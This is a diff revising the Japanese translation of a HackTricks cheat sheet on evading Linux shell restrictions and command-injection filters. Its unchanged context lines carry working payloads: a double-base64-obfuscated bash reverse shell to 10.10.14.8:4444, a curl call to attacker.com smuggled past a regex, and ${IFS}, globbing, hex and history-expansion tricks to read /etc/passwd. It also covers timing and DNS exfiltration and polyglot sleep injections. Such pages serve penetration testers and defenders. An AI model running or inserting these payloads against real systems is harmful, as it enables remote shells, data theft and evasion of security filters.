@@ -1,16 +1,16 @@
-# Linuxの制限をバイパスする
+# Linuxの制限を回避する
 
 {% hint style="success" %}
-AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWSハッキングを学び、練習する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、練習する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>HackTricksをサポートする</summary>
 
-* [**購読プラン**](https://github.com/sponsors/carlospolop)をチェック！
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
-* **HackTricks**と**HackTricks Cloud**のGitHubリポジトリにPRを提出して、ハッキングトリックを共有してください。
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
 {% endhint %}
@@ -18,12 +18,12 @@ GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png
 <figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
-今すぐアクセスしてください：
+[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって駆動される**ワークフローを簡単に構築し、自動化**します。\
+今すぐアクセスを取得：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-## 一般的な制限バイパス
+## 一般的な制限の回避
 
 ### リバースシェル
 ```bash
@@ -31,7 +31,7 @@ GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### 短い Rev shell
+### ショート Rev シェル
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -39,7 +39,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### パスと禁止ワードのバイパス
+### パスと禁止された単語のバイパス
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -94,7 +94,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### 禁止されたスペースをバイパス
+### 禁止されたスペースをバイパスする
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -127,16 +127,16 @@ g # These 4 lines will equal to ping
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### バックスラッシュとスラッシュをバイパス
+### バックスラッシュとスラッシュをバイパスする
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### パイプをバイパス
+### パイプをバイパスする
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### ヘックスエンコーディングを使用してバイパス
+### ヘックスエンコーディングによるバイパス
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -146,12 +146,12 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-### IP バイパス
+### IPをバイパスする
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-### 時間ベースのデータ外部流出
+### 時間ベースのデータ流出
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
@@ -160,14 +160,14 @@ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-### DNSデータの流出
+### DNSデータの抽出
 
-例えば**burpcollab**または[**pingb**](http://pingb.in)を使用できます。
+例えば、**burpcollab**や[**pingb**](http://pingb.in)を使用できます。
 
-### 組み込みコマンド
+### ビルトイン
 
-外部関数を実行できず、**RCEを取得するために組み込みコマンドの限られたセットにアクセスできる**場合、それを行うための便利なトリックがいくつかあります。通常、**すべての組み込みコマンドを使用できない**ことが多いので、刑務所をバイパスしようとするために**すべてのオプションを知っておく必要があります**。[**devploit**](https://twitter.com/devploit)からのアイデア。\
-まず、すべての[**シェル組み込みコマンド**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**を確認します**。次に、いくつかの**推奨事項**があります：
+外部関数を実行できず、**RCEを取得するための限られたビルトインのセットにのみアクセスできる**場合、いくつかの便利なトリックがあります。通常、**すべての**ビルトインを使用することはできないため、**すべてのオプションを知っておく**必要があります。アイデアは[**devploit**](https://twitter.com/devploit)から。\
+まず、すべての[**シェルビルトイン**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**を確認してください。** 次に、いくつかの**推奨事項**があります：
 ```bash
 # Get list of builtins
 declare builtins
@@ -224,7 +224,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### 潜在的な正規表現のバイパス
+### 潜在的な正規表現をバイパスする
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -318,44 +318,44 @@ ln /f*
 ```
 ## 読み取り専用/Noexec/Distroless バイパス
 
-**読み取り専用および noexec 保護**または distroless コンテナ内にいる場合でも、**任意のバイナリを実行する方法があります。シェルさえも！:**
+**読み取り専用および noexec 保護**があるファイルシステム内、または distroless コンテナ内にいる場合でも、**任意のバイナリを実行する方法、さらにはシェルを実行する方法がまだあります!:**
 
 {% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
 [bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
 {% endcontent-ref %}
 
-## Chroot および他の牢屋バイパス
+## Chroot & その他の Jail バイパス
 
 {% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
 [escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
 {% endcontent-ref %}
 
-## 参考文献とその他
+## 参考文献 & その他
 
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 * [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 * [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 * [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) を使用して、世界で最も高度なコミュニティツールによって強化された **ワークフローを簡単に構築**および **自動化** できます。\
-今すぐアクセスしてください：
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で**最も先進的な**コミュニティツールによって駆動される**ワークフローを簡単に構築および自動化**します。\
+今日アクセスを取得：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 {% hint style="success" %}
-AWS ハッキングの学習と実践:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP ハッキングの学習と実践: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS ハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP ハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>HackTricks のサポート</summary>
+<summary>HackTricksをサポートする</summary>
 
-* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop) をチェックしてください！
-* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** をフォローしてください。**
-* [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出してハッキングトリックを共有してください。
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
 {% endhint %}
